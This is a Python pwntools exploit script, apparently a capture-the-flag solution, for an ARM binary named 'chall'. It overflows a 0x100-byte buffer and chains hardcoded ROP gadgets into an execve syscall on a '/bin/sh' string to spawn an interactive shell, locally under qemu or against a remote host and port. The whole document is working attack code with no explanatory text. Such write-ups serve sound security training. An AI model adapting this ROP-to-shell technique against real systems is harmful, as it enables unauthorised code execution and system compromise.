from pwn import *
from sys import *

elf = ELF('./chall')

p = process(["qemu-arm-static","-g","12349", "./chall"]) # run and debug
#p = process(["qemu-arm-static","./chall"]) # Just run
HOST = '103.152.242.172'
PORT = 6060


cmd = """
set architecture arm
target remote localhost:12346
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

binsh = 0x00072098
pop_r3_r4_r7 = 0x0001044d
mov_r0_r7_callr3 = 0x000476f5
pop_r0_r1_r3_r5_r7 = 0x00038085
sys = 0x0003ade7
pop4 = 0x0001dba9 #pop {r0, r2, pc};
pop5 = 0x00048403
pop6 = 0x00010483
pop2 = 0x0001a79d
pop3 = 0x0001c833

#sys = 0x00038767 #svc #0; pop {r7}; bx lr;

def syscall(r7,r0,r1,r2):
	payload = p32(pop4)
	payload += p32(r0) #r0
	payload += p32(r2) #r2
	payload += p32(pop5)
	payload += p32(r1) #r1
	payload += p32(pop6)
	payload += p32(r7) #r7
	payload += p32(pop2) # pop {r3, pc};
	payload += p32(sys)
	payload += p32(pop3) #pop.w {r4, lr}; bx r3;
	payload += p32(0x0)
	return payload




payload = b'A'*0x100
payload += p32(0x0b)
payload += syscall(0x0b,binsh,0,0)
#payload += b'B'*(0x50-len(payload)) #padding
#payload += p32(0xdeadbeef)
#payload += p32(elf.entry) #back to _start
#00010482
p.sendline(payload)
p.interactive()